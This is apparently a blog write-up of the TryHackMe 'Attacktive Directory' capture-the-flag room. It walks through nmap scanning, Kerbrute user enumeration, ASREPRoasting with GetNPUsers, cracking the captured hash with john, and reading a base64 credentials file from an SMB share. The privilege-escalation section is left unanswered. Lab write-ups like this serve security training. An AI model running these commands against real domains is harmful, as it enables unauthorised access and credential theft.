---
title: TryHackMe - Attacktive Directory
published: true
---

[https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)

99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

![](/assets/rpnessusredux.png)

* * *

## [](#header-2)Task 3 - Welcome to Attacktive Directory 

```
┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
└─$ nmap -sV -sC -T4 10.10.132.136 -p- -oN initial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 06:44 PDT
Nmap scan report for 10.10.132.136
Host is up (0.20s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-20 13:52:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-20T13:53:52+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-20T13:53:44+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-06-19T13:26:08
|_Not valid after:  2022-12-19T13:26:08
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-20T13:53:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 576.98 seconds
```

##### [](#header-5)Answer the questions below

**What tool will allow us to enumerate port 139/445?**

- ``enum4linux -a 10.10.132.136 -R 139,445``
- enum4linux

**What is the NetBIOS-Domain Name of the machine?**

- THM-AD

**What invalid TLD do people commonly use for their Active Directory Domain?**

- .local

* * * 

## [](#header-2)Task 4 - Enumeration Enumerating Users via Kerberos 

Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!

##### [](#header-5)Answer the questions below

**What command within Kerbrute will allow us to enumerate valid usernames?**

- userenum

**What notable account is discovered? (These should jump out at you)**

- ``./kerbrute_linux_amd64 userenum --dc 10.10.132.136:88 -d spookysec.local userlist.txt``

```
2022/06/20 07:49:18 >  [+] VALID USERNAME:       james@spookysec.local
2022/06/20 07:49:21 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/06/20 07:49:25 >  [+] VALID USERNAME:       James@spookysec.local
2022/06/20 07:49:26 >  [+] VALID USERNAME:       robin@spookysec.local
2022/06/20 07:49:43 >  [+] VALID USERNAME:       darkstar@spookysec.local
2022/06/20 07:49:53 >  [+] VALID USERNAME:       administrator@spookysec.local
2022/06/20 07:50:12 >  [+] VALID USERNAME:       backup@spookysec.local
2022/06/20 07:50:21 >  [+] VALID USERNAME:       paradox@spookysec.local
2022/06/20 07:51:19 >  [+] VALID USERNAME:       JAMES@spookysec.local
2022/06/20 07:51:39 >  [+] VALID USERNAME:       Robin@spookysec.local
2022/06/20 07:53:35 >  [+] VALID USERNAME:       Administrator@spookysec.local
2022/06/20 07:57:30 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2022/06/20 07:58:45 >  [+] VALID USERNAME:       Paradox@spookysec.local
2022/06/20 08:03:03 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2022/06/20 08:04:17 >  [+] VALID USERNAME:       ori@spookysec.local
2022/06/20 08:06:32 >  [+] VALID USERNAME:       ROBIN@spookysec.local
```

**What is the other notable account is discovered? (These should jump out at you)**

- svc-admin

**What is the other notable account is discovered? (These should jump out at you)**

- backup

* * *

## [](#header-2)Task 5 - Exploitation Abusing Kerberos 

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

##### [](#header-5)Answer the questions below

**We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?**

- ``/opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.10.132.136 -usersfile users.txt -format hashcat -outputfile hashes.txt``
- svc-admin

**Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)**

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f45f55f20e6fab0b565c84565e77bf8c$6fc870818e2691f65612966f462ec3d973acaeab9cd87dcf13e50a9454945c8de2f046e6b02f440b5232c9cc34cb18f4485915206a8e3264c4aee2e9442ff8104c9389ab4ae875c90916b5accb02680e7e781a71c95df510ffc11a3fc36cb0ae36bb48b03a8ebd617c1a3532e3e439acf5e4d097498aa91c08aa3ded9a54ad91a7aefcfa1ac4ee47f5bb85e38f9174bdac51a7a3896b52833f5448f246d08797f199e004ea4ecd77f6b57d01a26e6930fea74f331143f356d392c6f8ec8f394b1602557611cb585fe2d189cf5d01f7a1a272255b4f350640104b94c40cb8605b3eff072fc5e502fe49e5230c26384012e952
```

- https://hashcat.net/wiki/doku.php?id=example_hashes
- Kerberos 5, etype 23, AS-REP

**What mode is the hash?**

- https://hashcat.net/wiki/doku.php?id=example_hashes
- 18200

**Now crack the hash with the modified password list provided, what is the user accounts password?**

- ``john --wordlist=passwordlist.txt --format=krb5asrep hash.txt``
- management2005

* * * 

## [](#header-2)Task 5 Exploitation Abusing Kerberos

### [](#header-3)Enumeration:

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

``man smbclient``

##### [](#header-5)Answer the questions below

**What utility can we use to map remote SMB shares?**

- ``smbclient``

**Which option will list shares?**

- ``-L``

**How many remote shares is the server listing?**

- ``smbclient -L \\\\10.10.132.136 --workgroup=spookysec.local -U "svc-admin"``
- 6 shares

**There is one particular share that we have access to that contains a text file. Which share is it?**

- ``smbclient \\\\10.10.132.136\\backup\\ --workgroup=spookysec.local -U "svc-admin"``

**What is the content of the file?**

- ``mget backup_credentials.txt``
- YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

**Decoding the contents of the file, what is the full contents?**

- base64 decrypt = ``backup@spookysec.local:backup2517860``

* * * 

## [](#header-2)Task 7 - Domain Privilege Escalation - Elevating Privileges within the Domain 

We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the (AD) Active Directory Domain.

##### [](#header-5)Answer the questions below

**What method allowed us to dump NTDS.DIT?**



**What is the Administrators NTLM hash?**



**What method of attack could allow us to authenticate as the user without the password?**



**Using a tool called Evil-WinRM what option will allow us to use a hash?**



* * * 







